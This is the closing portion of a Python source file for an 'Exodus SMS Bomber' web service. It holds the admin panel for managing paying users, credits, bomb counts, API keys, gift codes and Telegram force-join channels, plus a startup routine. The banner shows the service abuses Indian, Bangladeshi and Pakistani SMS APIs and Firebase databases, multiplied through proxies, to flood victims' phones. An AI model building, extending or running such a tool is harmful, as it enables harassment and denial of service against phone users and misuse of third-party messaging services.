th{text-align:left;padding:.5rem;color:#64748b;border-bottom:1px solid rgba(255,255,255,.07)}
td{padding:.5rem;border-bottom:1px solid rgba(255,255,255,.04)}
.badge{padding:.2rem .5rem;border-radius:.3rem;font-size:.7rem;font-weight:700}
.badge-green{background:rgba(16,185,129,.15);color:#10b981}
.badge-red{background:rgba(239,68,68,.15);color:#ef4444}
.badge-blue{background:rgba(59,130,246,.15);color:#3b82f6}
.action-btn{padding:.25rem .6rem;border:none;border-radius:.35rem;font-size:.72rem;cursor:pointer;font-weight:600;margin:0 .1rem}
.action-btn.ban{background:rgba(239,68,68,.2);color:#ef4444}
.action-btn.unban{background:rgba(16,185,129,.2);color:#10b981}
.action-btn.credits{background:rgba(234,179,8,.2);color:#eab308}
.nav-tabs{display:flex;gap:.5rem;margin-bottom:1.5rem;flex-wrap:wrap}
.tab{padding:.5rem 1rem;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:.5rem;cursor:pointer;font-size:.82rem;color:#94a3b8}
.tab.active,.tab:hover{background:rgba(139,92,246,.2);border-color:#8b5cf6;color:#fff}
.view{display:none}.view.active{display:block}
#err{color:#ef4444;font-size:.85rem;margin-top:.5rem;display:none}
#panel{display:none}
input[type=text]{width:100%;padding:.6rem .8rem;background:#0f172a;border:1px solid rgba(255,255,255,.1);border-radius:.5rem;color:#e2e8f0;font-size:.85rem;outline:none;margin-bottom:.5rem}
.small-btn{padding:.45rem .9rem;border:none;border-radius:.4rem;font-size:.8rem;cursor:pointer;font-weight:700}
.small-btn.primary{background:rgba(139,92,246,.3);color:#a78bfa}
.small-btn.danger{background:rgba(239,68,68,.2);color:#f87171}
.small-btn.success{background:rgba(16,185,129,.2);color:#34d399}
</style>
</head>
<body>
<div class="wrap">
  <div id="login-view" class="login-box">
    <h2>🛡️ Admin Login</h2>
    <input id="pw" type="password" class="inp" placeholder="Admin password" autocomplete="current-password">
    <button class="btn" onclick="doLogin()">Login</button>
    <div id="err">Wrong password</div>
  </div>
  <div id="panel">
    <h1>💣 Exodus Bomber — Admin Panel</h1>
    <div class="stat-row" id="stats"></div>
    <div class="nav-tabs">
      <div class="tab active" onclick="showView('users')">👥 Users</div>
      <div class="tab" onclick="showView('keys')">🔑 Keys</div>
      <div class="tab" onclick="showView('channels')">📢 Channels</div>
      <div class="tab" onclick="showView('gifts')">🎟️ Gifts</div>
      <div class="tab" onclick="showView('import')">💾 Import DB</div>
    </div>
    <div id="v-users" class="view active section">
      <h3>👥 User Manager</h3>
      <div style="display:flex;gap:.5rem;margin-bottom:1rem;flex-wrap:wrap">
        <input type="text" id="uid-input" placeholder="User ID" style="width:160px;margin:0">
        <button class="small-btn primary" onclick="findUser()">Find</button>
        <button class="small-btn success" onclick="loadUsers()">Load All</button>
      </div>
      <div id="user-detail" style="display:none;margin-bottom:1rem;padding:1rem;background:#0f172a;border-radius:.6rem;font-size:.82rem"></div>
      <div style="overflow-x:auto">
      <table id="users-table">
        <thead><tr><th>ID</th><th>Name</th><th>Credits</th><th>Bombs</th><th>Premium</th><th>Status</th><th>Actions</th></tr></thead>
        <tbody id="users-body"><tr><td colspan="7" style="color:#64748b;text-align:center">Click "Load All"</td></tr></tbody>
      </table>
      </div>
    </div>
    <div id="v-keys" class="view section">
      <h3>🔑 API Keys</h3>
      <div style="display:flex;gap:.5rem;margin-bottom:1rem;flex-wrap:wrap">
        <input type="text" id="key-uid" placeholder="User ID" style="width:160px;margin:0">
        <input type="text" id="key-days" placeholder="Days (e.g. 30)" style="width:120px;margin:0">
        <button class="small-btn success" onclick="genKey()">Generate</button>
      </div>
      <div id="key-result" style="font-family:monospace;font-size:.8rem;color:#22d3ee;margin-bottom:1rem"></div>
      <div style="overflow-x:auto">
      <table><thead><tr><th>Key</th><th>User</th><th>Plan</th><th>Expires</th><th>Status</th><th>Action</th></tr></thead>
      <tbody id="keys-body"><tr><td colspan="6" style="color:#64748b;text-align:center">Loading…</td></tr></tbody></table>
      </div>
    </div>
    <div id="v-channels" class="view section">
      <h3>📢 Force-Join Channels</h3>
      <div style="display:flex;gap:.5rem;margin-bottom:1rem;flex-wrap:wrap">
        <input type="text" id="ch-id" placeholder="Chat ID (-100…)" style="width:180px;margin:0">
        <input type="text" id="ch-title" placeholder="Title" style="width:140px;margin:0">
        <input type="text" id="ch-link" placeholder="https://t.me/…" style="width:200px;margin:0">
        <button class="small-btn success" onclick="addChannel()">Add</button>
      </div>
      <table><thead><tr><th>ID</th><th>Title</th><th>Link</th><th>Action</th></tr></thead>
      <tbody id="ch-body"><tr><td colspan="4" style="color:#64748b;text-align:center">Loading…</td></tr></tbody></table>
    </div>
    <div id="v-gifts" class="view section">
      <h3>🎟️ Gift Codes</h3>
      <div style="display:flex;gap:.5rem;margin-bottom:1rem;flex-wrap:wrap">
        <input type="text" id="g-credits" placeholder="Credits" style="width:100px;margin:0">
        <input type="text" id="g-users" placeholder="Max Users (0=∞)" style="width:140px;margin:0">
        <input type="text" id="g-days" placeholder="Valid Days" style="width:110px;margin:0">
        <button class="small-btn success" onclick="createGift(false)">Create</button>
        <button class="small-btn primary" onclick="createGift(true)">+ Premium</button>
      </div>
      <div id="gift-result" style="font-family:monospace;font-size:.8rem;color:#22d3ee;margin-bottom:1rem"></div>
      <table><thead><tr><th>Code</th><th>Credits</th><th>Claimed</th><th>Premium</th><th>Expires</th><th>Action</th></tr></thead>
      <tbody id="gift-body"><tr><td colspan="6" style="color:#64748b;text-align:center">Loading…</td></tr></tbody></table>
    </div>
    <div id="v-import" class="view section">
      <h3>💾 Import Database</h3>
      <textarea id="import-json" style="width:100%;height:200px;background:#0f172a;border:1px solid rgba(255,255,255,.1);border-radius:.5rem;color:#e2e8f0;padding:.8rem;font-family:monospace;font-size:.78rem;resize:vertical" placeholder='{"users":[]}'></textarea>
      <div style="margin-top:.75rem;display:flex;gap:.5rem">
        <button class="small-btn success" onclick="doImport()">Import Users</button>
        <button class="small-btn primary" onclick="doExport()">Export All</button>
      </div>
      <div id="import-result" style="margin-top:.75rem;font-size:.82rem;color:#34d399"></div>
    </div>
  </div>
</div>
<script>
let TOKEN='';
const E=s=>String(s).replace(/</g,'&lt;').replace(/>/g,'&gt;');
const fmtTime=ts=>ts?new Date(ts*1000).toLocaleDateString():'—';
async function api(path,method='GET',body=null){
  const opts={method,headers:{'Content-Type':'application/json','X-Admin-Token':TOKEN}};
  if(body)opts.body=JSON.stringify(body);
  const r=await fetch('/admin/api'+path,opts);
  return r.json();
}
async function doLogin(){
  const pw=document.getElementById('pw').value;
  const d=await api('/login','POST',{password:pw});
  if(d.token){TOKEN=d.token;document.getElementById('login-view').style.display='none';document.getElementById('panel').style.display='block';init();}
  else{document.getElementById('err').style.display='block';}
}
async function init(){loadStats();loadKeys();loadChannels();loadGifts();}
async function loadStats(){
  const d=await api('/stats');
  const keys=[['users','👥 Users'],['banned','🚫 Banned'],['keys','🔑 Keys'],['bombs','💣 Bombs'],['channels','📢 Channels'],['premium','💎 Premium'],['total_credits','💰 Credits'],['proxy_multiplier','⚡ Multiplier']];
  document.getElementById('stats').innerHTML=keys.map(([k,l])=>`<div class="stat"><div class="stat-v">${d[k]??0}${k==='proxy_multiplier'?'×':''}</div><div class="stat-l">${l}</div></div>`).join('');
}
function showView(v){document.querySelectorAll('.view').forEach(el=>el.classList.remove('active'));document.querySelectorAll('.tab').forEach(el=>el.classList.remove('active'));document.getElementById('v-'+v).classList.add('active');event.target.classList.add('active');}
async function loadUsers(){
  const rows=await api('/users');
  const tb=document.getElementById('users-body');
  if(!rows.length){tb.innerHTML='<tr><td colspan="7" style="color:#64748b;text-align:center">No users</td></tr>';return;}
  tb.innerHTML=rows.slice(0,200).map(u=>`<tr><td><code style="font-size:.7rem">${u.id}</code></td><td>${E(u.first_name||'')} ${u.username?'@'+E(u.username):''}</td><td>${u.credits||0}</td><td>${u.total_bombs||0}</td><td>${u.is_premium?'<span class="badge badge-blue">💎</span>':'—'}</td><td>${u.banned?'<span class="badge badge-red">Banned</span>':'<span class="badge badge-green">Active</span>'}</td><td>${u.banned?`<button class="action-btn unban" onclick="modUser('${u.id}','unban')">Unban</button>`:`<button class="action-btn ban" onclick="modUser('${u.id}','ban')">Ban</button>`}<button class="action-btn credits" onclick="addCredits('${u.id}')">+Credits</button></td></tr>`).join('');
}
async function findUser(){const uid=document.getElementById('uid-input').value.trim();if(!uid)return;const rows=await api('/users');const u=rows.find(x=>String(x.id)===uid);const d=document.getElementById('user-detail');if(!u){d.style.display='block';d.innerHTML='<span style="color:#ef4444">Not found</span>';return;}d.style.display='block';d.innerHTML=`<b>ID:</b> ${u.id} | <b>Name:</b> ${E(u.first_name)} | <b>Credits:</b> ${u.credits||0} | <b>Bombs:</b> ${u.total_bombs||0} | <b>Premium:</b> ${u.is_premium?'✅':'❌'} | <b>Banned:</b> ${u.banned?'🚫':'✅'}<br><span style="margin-top:.5rem;display:inline-flex;gap:.4rem;flex-wrap:wrap">${u.banned?`<button class="small-btn success" onclick="modUser('${u.id}','unban')">Unban</button>`:`<button class="small-btn danger" onclick="modUser('${u.id}','ban')">Ban</button>`}<button class="small-btn success" onclick="addCredits('${u.id}')">+Credits</button>${u.is_premium?`<button class="small-btn danger" onclick="togglePrem('${u.id}',false)">Remove Premium</button>`:`<button class="small-btn primary" onclick="togglePrem('${u.id}',true)">Make Premium</button>`}</span>`;}
async function modUser(uid,action){await api('/users/'+uid+'/'+action,'POST');loadUsers();findUser();loadStats();}
async function addCredits(uid){const amt=prompt('Credits to add:');if(!amt||isNaN(amt))return;await api('/users/'+uid+'/credits','POST',{amount:parseInt(amt)});alert('Done!');loadUsers();}
async function togglePrem(uid,val){await api('/users/'+uid+'/premium','POST',{premium:val});findUser();}
async function loadKeys(){
  const rows=await api('/keys');const tb=document.getElementById('keys-body');const now=Date.now()/1000;
  if(!rows.length){tb.innerHTML='<tr><td colspan="6" style="color:#64748b;text-align:center">No keys</td></tr>';return;}
  tb.innerHTML=rows.map(k=>`<tr><td><code style="font-size:.7rem">${E(k.key)}</code></td><td><code style="font-size:.7rem">${k.user_id}</code></td><td>${E(k.plan||'—')}</td><td>${fmtTime(k.expires_at)}</td><td>${k.revoked?'<span class="badge badge-red">Revoked</span>':(k.expires_at>now?'<span class="badge badge-green">Active</span>':'<span class="badge badge-red">Expired</span>')}</td><td><button class="action-btn ban" onclick="revokeKey('${E(k.key)}')">Revoke</button></td></tr>`).join('');
}
async function genKey(){const uid=document.getElementById('key-uid').value.trim();const days=parseInt(document.getElementById('key-days').value)||30;if(!uid)return alert('Enter user ID');const d=await api('/keys','POST',{user_id:uid,days});document.getElementById('key-result').textContent=d.success?'Key: '+d.key:'Error: '+d.error;loadKeys();}
async function revokeKey(key){if(!confirm('Revoke?'))return;await api('/keys/'+encodeURIComponent(key),'DELETE');loadKeys();}
async function loadChannels(){const rows=await api('/channels');const tb=document.getElementById('ch-body');if(!rows.length){tb.innerHTML='<tr><td colspan="4" style="color:#64748b;text-align:center">No channels</td></tr>';return;}tb.innerHTML=rows.map(c=>`<tr><td><code>${E(c.chat_id||c.id)}</code></td><td>${E(c.title||'—')}</td><td><a href="${E(c.link||'')}" target="_blank" style="color:#8b5cf6;font-size:.75rem">${E(c.link||'—')}</a></td><td><button class="action-btn ban" onclick="delChannel('${E(c.chat_id||c.id)}')">Remove</button></td></tr>`).join('');}
async function addChannel(){const id=document.getElementById('ch-id').value.trim();const title=document.getElementById('ch-title').value.trim();const link=document.getElementById('ch-link').value.trim();if(!id)return alert('Enter chat ID');await api('/channels','POST',{chat_id:id,title,link});loadChannels();['ch-id','ch-title','ch-link'].forEach(i=>document.getElementById(i).value='');}
async function delChannel(id){await api('/channels/'+encodeURIComponent(id),'DELETE');loadChannels();}
async function loadGifts(){const rows=await api('/gift');const tb=document.getElementById('gift-body');const now=Date.now()/1000;if(!rows.length){tb.innerHTML='<tr><td colspan="6" style="color:#64748b;text-align:center">No gift codes</td></tr>';return;}tb.innerHTML=rows.map(g=>`<tr><td><code style="font-size:.7rem">${E(g.code)}</code></td><td>${g.credits}</td><td>${g.claimed_count||0}/${g.max_users||'∞'}</td><td>${g.is_premium?'<span class="badge badge-blue">💎</span>':'—'}</td><td>${g.expires_at?fmtTime(g.expires_at):'Never'}</td><td><button class="action-btn ban" onclick="delGift('${E(g.code)}')">Delete</button></td></tr>`).join('');}
async function createGift(premium){const credits=parseInt(document.getElementById('g-credits').value)||0;const max_users=parseInt(document.getElementById('g-users').value)||0;const days_valid=parseInt(document.getElementById('g-days').value)||7;if(!credits)return alert('Enter credits');const d=await api('/gift','POST',{credits,max_users,days_valid,is_premium:premium});document.getElementById('gift-result').textContent=d.success?'Created: '+d.code:'Error: '+d.error;loadGifts();}
async function delGift(code){if(!confirm('Delete?'))return;await api('/gift/'+encodeURIComponent(code),'DELETE');loadGifts();}
async function doImport(){const raw=document.getElementById('import-json').value.trim();if(!raw)return;try{const data=JSON.parse(raw);const d=await api('/import','POST',data);document.getElementById('import-result').textContent=d.success?'Imported '+d.imported+' users ✅':'Error: '+d.error;loadStats();}catch(e){document.getElementById('import-result').textContent='Invalid JSON: '+e.message;}}
async function doExport(){const d=await api('/export');const blob=new Blob([JSON.stringify(d,null,2)],{type:'application/json'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='exodus_export.json';a.click();}
document.getElementById('pw').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin();});
</script>
</body></html>"""


# ═══════════════════════════════════════════════════════════════
#  STARTUP — runs on import (gunicorn) AND on direct run
# ═══════════════════════════════════════════════════════════════
def _startup():
    init_sqlite()
    load_proxies()
    print(f"""
{'='*60}
  ✅ EXODUS SMS BOMBER API STARTED
  🌐 Home:    {BASE_URL}/
  📊 Admin:   {BASE_URL}/admin
  🔌 Port:    {PORT}
  🇮🇳 India: {len(INDIA_SMS_APIS)} APIs + {len(INDIA_FIREBASE_DBS)} Firebase DBs + Custom
  🇧🇩 BD:    Exodus BD API x {PROXY_MULTIPLIER} proxies
  🇵🇰 PAK:   {len(PAK_SMS_APIS)} APIs  |  Mult: {PROXY_MULTIPLIER}x
  🔥 Firebase: {"YES" if _db else "NO"}  |  SQLite: {SQLITE_PATH}
{'='*60}
""", flush=True)
    try:
        import bot as _bot
        _bot.start_bot(PORT)
    except ImportError:
        print("[WARN] bot.py not found — Telegram bot disabled", flush=True)
    except Exception as e:
        print(f"[WARN] Bot startup error: {e}", flush=True)

_startup()   # gunicorn triggers this on import; python Main.py also triggers it


def main():
    """Entry point for direct run only."""
    app.run(host="0.0.0.0", port=PORT, debug=False, threaded=True)


if __name__ == "__main__":
    main()

